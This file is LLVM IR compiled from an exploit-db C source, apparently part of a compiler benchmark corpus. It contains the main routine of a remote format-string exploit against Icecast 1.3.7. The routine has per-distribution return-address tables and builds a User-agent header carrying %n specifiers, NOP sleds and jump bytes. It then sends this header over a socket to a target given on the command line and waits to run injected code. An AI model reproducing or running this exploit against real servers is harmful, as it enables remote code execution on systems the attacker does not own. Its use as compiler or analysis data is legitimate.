; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20582.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_20582.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.target = type { i8*, i8*, i8*, i8*, i8*, i32, i32, i32, i32, i32, i8*, i32, i32, i32, i32, i32, i8*, i8*, i8*, i8* }
%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [47 x i8] c"icecast-1.3.7.tar.gz compiled on Slackware 7.0\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"\1C\DB_\BF\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"\1D\DB_\BF\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"\1E\DB_\BF\00", align 1
@.str.4 = private unnamed_addr constant [5 x i8] c"\1F\DB_\BF\00", align 1
@.str.5 = private unnamed_addr constant [44 x i8] c"icecast-1.3.7.tar.gz compiled on Redhat 7.0\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"\D8\D8_\BF\00", align 1
@.str.7 = private unnamed_addr constant [5 x i8] c"\D9\D8_\BF\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"\DA\D8_\BF\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"\DB\D8_\BF\00", align 1
@__const.main.tl = private unnamed_addr constant [2 x %struct.target] [%struct.target { i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i32 0, i32 0), i32 123, i32 136, i32 96, i32 2076, i32 5, i8* null, i32 0, i32 0, i32 0, i32 0, i32 0, i8* null, i8* null, i8* null, i8* null }, %struct.target { i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.9, i32 0, i32 0), i32 116, i32 159, i32 96, i32 2074, i32 3, i8* null, i32 0, i32 0, i32 0, i32 0, i32 0, i8* null, i8* null, i8* null, i8* null }], align 16
@.str.10 = private unnamed_addr constant [63 x i8] c"Icecast 1.3.7 format bug exploit by |CyRaX| <cyrax@pkcrew.org\0A\00", align 1
@.str.11 = private unnamed_addr constant [46 x i8] c"Packet Knights Crew | http://www.pkcrew.org/\0A\00", align 1
@.str.12 = private unnamed_addr constant [48 x i8] c"Usage : ./PKCicecast-ex <target> <port> <type>\0A\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"types are :\0A\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"%2i : %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@ip = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [16 x i8] c"GET / HTTP/1.0\0A\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"%8x\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"\EB\02\00", align 1
@.str.18 = private unnamed_addr constant [49 x i8] c"User-agent: %s%s%s%s%s%s%%n%s%%n%s%%n%s%%n%s%s\0A\0A\00", align 1
@code = common dso_local global i8* null, align 8
@.str.19 = private unnamed_addr constant [72 x i8] c"We must sleep for 120 seconds. Waiting for icecast to do the statistic\0A\00", align 1
@SIGALRM = common dso_local global i32 0, align 4
@try_it = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca [9000 x i8], align 16
  %11 = alloca [9000 x i8], align 16
  %12 = alloca [300 x i8], align 16
  %13 = alloca [300 x i8], align 16
  %14 = alloca [300 x i8], align 16
  %15 = alloca [1000 x i8], align 16
  %16 = alloca [100 x i8], align 16
  %17 = alloca [2 x %struct.target], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = bitcast [2 x %struct.target]* %17 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %18, i8* align 16 bitcast ([2 x %struct.target]* @__const.main.tl to i8*), i64 256, i1 false)
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.10, i64 0, i64 0))
  %20 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.11, i64 0, i64 0))
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 4
  br i1 %22, label %23, label %43

23:                                               ; preds = %2
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.12, i64 0, i64 0))
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.13, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %26

26:                                               ; preds = %38, %23
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = icmp ult i64 %28, 2
  br i1 %29, label %30, label %41

30:                                               ; preds = %26
  %31 = load i32, i32* %7, align 4
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %33
  %35 = getelementptr inbounds %struct.target, %struct.target* %34, i32 0, i32 10
  %36 = load i8*, i8** %35, align 16
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0), i32 %31, i8* %36)
  br label %38

38:                                               ; preds = %30
  %39 = load i32, i32* %7, align 4
  %40 = add nsw i32 %39, 1
  store i32 %40, i32* %7, align 4
  br label %26

41:                                               ; preds = %26
  %42 = call i32 @exit(i32 0) #4
  unreachable

43:                                               ; preds = %2
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 3
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @atoi(i8* %46)
  store i32 %47, i32* %8, align 4
  %48 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %49 = call i32 @memset(i8* %48, i8 signext 0, i32 9000)
  %50 = getelementptr inbounds [9000 x i8], [9000 x i8]* %11, i64 0, i64 0
  %51 = call i32 @memset(i8* %50, i8 signext 0, i32 9000)
  %52 = getelementptr inbounds [300 x i8], [300 x i8]* %12, i64 0, i64 0
  %53 = call i32 @memset(i8* %52, i8 signext 0, i32 300)
  %54 = getelementptr inbounds [300 x i8], [300 x i8]* %13, i64 0, i64 0
  %55 = call i32 @memset(i8* %54, i8 signext 0, i32 300)
  %56 = getelementptr inbounds [300 x i8], [300 x i8]* %14, i64 0, i64 0
  %57 = call i32 @memset(i8* %56, i8 signext 0, i32 300)
  %58 = getelementptr inbounds [100 x i8], [100 x i8]* %16, i64 0, i64 0
  %59 = call i32 @memset(i8* %58, i8 signext 0, i32 100)
  %60 = getelementptr inbounds [1000 x i8], [1000 x i8]* %15, i64 0, i64 0
  %61 = call i32 @memset(i8* %60, i8 signext -112, i32 1000)
  %62 = getelementptr inbounds [1000 x i8], [1000 x i8]* %15, i64 0, i64 1000
  store i8 0, i8* %62, align 8
  %63 = load i32, i32* @AF_INET, align 4
  %64 = load i32, i32* @SOCK_STREAM, align 4
  %65 = call i32 @socket(i32 %63, i32 %64, i32 0)
  store i32 %65, i32* %6, align 4
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @inet_addr(i8* %68)
  store i32 %69, i32* @ip, align 4
  %70 = load i32, i32* @ip, align 4
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %72 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %71, i32 0, i32 0
  store i32 %70, i32* %72, align 4
  %73 = load i8**, i8*** %5, align 8
  %74 = getelementptr inbounds i8*, i8** %73, i64 2
  %75 = load i8*, i8** %74, align 8
  %76 = call i32 @atoi(i8* %75)
  %77 = call i32 @htons(i32 %76)
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %77, i32* %78, align 4
  %79 = load i32, i32* @AF_INET, align 4
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %79, i32* %80, align 4
  %81 = load i32, i32* %6, align 4
  %82 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %83 = call i32 @connect(i32 %81, %struct.sockaddr* %82, i32 12)
  %84 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %85 = call i32 @strcpy(i8* %84, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i64 0, i64 0))
  %86 = load i32, i32* %6, align 4
  %87 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %88 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %89 = call i32 @strlen(i8* %88)
  %90 = call i32 @send(i32 %86, i8* %87, i32 %89, i32 0)
  store i32 0, i32* %7, align 4
  br label %91

91:                                               ; preds = %106, %43
  %92 = load i32, i32* %7, align 4
  %93 = load i32, i32* %8, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %94
  %96 = getelementptr inbounds %struct.target, %struct.target* %95, i32 0, i32 11
  %97 = load i32, i32* %96, align 8
  %98 = mul nsw i32 %97, 3
  %99 = icmp sle i32 %92, %98
  br i1 %99, label %100, label %109

100:                                              ; preds = %91
  %101 = getelementptr inbounds [9000 x i8], [9000 x i8]* %11, i64 0, i64 0
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = call i32 @memcpy(i8* %104, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i64 0, i64 0), i32 3)
  br label %106

106:                                              ; preds = %100
  %107 = load i32, i32* %7, align 4
  %108 = add nsw i32 %107, 3
  store i32 %108, i32* %7, align 4
  br label %91

109:                                              ; preds = %91
  %110 = getelementptr inbounds [300 x i8], [300 x i8]* %12, i64 0, i64 0
  %111 = load i32, i32* %8, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %112
  %114 = getelementptr inbounds %struct.target, %struct.target* %113, i32 0, i32 12
  %115 = load i32, i32* %114, align 4
  %116 = call i32 @memset(i8* %110, i8 signext -112, i32 %115)
  %117 = getelementptr inbounds [300 x i8], [300 x i8]* %13, i64 0, i64 0
  %118 = load i32, i32* %8, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %119
  %121 = getelementptr inbounds %struct.target, %struct.target* %120, i32 0, i32 13
  %122 = load i32, i32* %121, align 16
  %123 = call i32 @memset(i8* %117, i8 signext -112, i32 %122)
  %124 = getelementptr inbounds [300 x i8], [300 x i8]* %14, i64 0, i64 0
  %125 = load i32, i32* %8, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %126
  %128 = getelementptr inbounds %struct.target, %struct.target* %127, i32 0, i32 14
  %129 = load i32, i32* %128, align 4
  %130 = call i32 @memset(i8* %124, i8 signext -112, i32 %129)
  %131 = getelementptr inbounds [300 x i8], [300 x i8]* %12, i64 0, i64 0
  %132 = getelementptr inbounds [300 x i8], [300 x i8]* %12, i64 0, i64 0
  %133 = call i32 @strlen(i8* %132)
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds i8, i8* %131, i64 %134
  %136 = getelementptr inbounds i8, i8* %135, i64 -2
  %137 = call i32 @memcpy(i8* %136, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i32 2)
  %138 = getelementptr inbounds [300 x i8], [300 x i8]* %13, i64 0, i64 0
  %139 = getelementptr inbounds [300 x i8], [300 x i8]* %13, i64 0, i64 0
  %140 = call i32 @strlen(i8* %139)
  %141 = sext i32 %140 to i64
  %142 = getelementptr inbounds i8, i8* %138, i64 %141
  %143 = getelementptr inbounds i8, i8* %142, i64 -2
  %144 = call i32 @memcpy(i8* %143, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i32 2)
  %145 = getelementptr inbounds [300 x i8], [300 x i8]* %14, i64 0, i64 0
  %146 = getelementptr inbounds [300 x i8], [300 x i8]* %14, i64 0, i64 0
  %147 = call i32 @strlen(i8* %146)
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds i8, i8* %145, i64 %148
  %150 = getelementptr inbounds i8, i8* %149, i64 -2
  %151 = call i32 @memcpy(i8* %150, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i32 2)
  %152 = getelementptr inbounds [100 x i8], [100 x i8]* %16, i64 0, i64 0
  %153 = load i32, i32* %8, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %154
  %156 = getelementptr inbounds %struct.target, %struct.target* %155, i32 0, i32 15
  %157 = load i32, i32* %156, align 8
  %158 = call i32 @memset(i8* %152, i8 signext 88, i32 %157)
  %159 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %160 = getelementptr inbounds [100 x i8], [100 x i8]* %16, i64 0, i64 0
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %162
  %164 = getelementptr inbounds %struct.target, %struct.target* %163, i32 0, i32 16
  %165 = load i8*, i8** %164, align 16
  %166 = load i32, i32* %8, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %167
  %169 = getelementptr inbounds %struct.target, %struct.target* %168, i32 0, i32 17
  %170 = load i8*, i8** %169, align 8
  %171 = load i32, i32* %8, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %172
  %174 = getelementptr inbounds %struct.target, %struct.target* %173, i32 0, i32 18
  %175 = load i8*, i8** %174, align 16
  %176 = load i32, i32* %8, align 4
  %177 = sext i32 %176 to i64
  %178 = getelementptr inbounds [2 x %struct.target], [2 x %struct.target]* %17, i64 0, i64 %177
  %179 = getelementptr inbounds %struct.target, %struct.target* %178, i32 0, i32 19
  %180 = load i8*, i8** %179, align 8
  %181 = getelementptr inbounds [9000 x i8], [9000 x i8]* %11, i64 0, i64 0
  %182 = getelementptr inbounds [300 x i8], [300 x i8]* %12, i64 0, i64 0
  %183 = getelementptr inbounds [300 x i8], [300 x i8]* %13, i64 0, i64 0
  %184 = getelementptr inbounds [300 x i8], [300 x i8]* %14, i64 0, i64 0
  %185 = getelementptr inbounds [1000 x i8], [1000 x i8]* %15, i64 0, i64 0
  %186 = load i8*, i8** @code, align 8
  %187 = call i32 @sprintf(i8* %159, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.18, i64 0, i64 0), i8* %160, i8* %165, i8* %170, i8* %175, i8* %180, i8* %181, i8* %182, i8* %183, i8* %184, i8* %185, i8* %186)
  %188 = load i32, i32* %6, align 4
  %189 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %190 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %191 = call i32 @strlen(i8* %190)
  %192 = call i32 @send(i32 %188, i8* %189, i32 %191, i32 0)
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.19, i64 0, i64 0))
  %194 = call i32 @alarm(i32 120)
  %195 = load i32, i32* @SIGALRM, align 4
  %196 = load i32, i32* @try_it, align 4
  %197 = call i32 @signal(i32 %195, i32 %196)
  br label %198

198:                                              ; preds = %109, %198
  %199 = load i32, i32* %6, align 4
  %200 = getelementptr inbounds [9000 x i8], [9000 x i8]* %10, i64 0, i64 0
  %201 = call i32 @recv(i32 %199, i8* %200, i32 9000, i32 0)
  br label %198
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @sprintf(i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*) #2

declare dso_local i32 @alarm(i32) #2

declare dso_local i32 @signal(i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
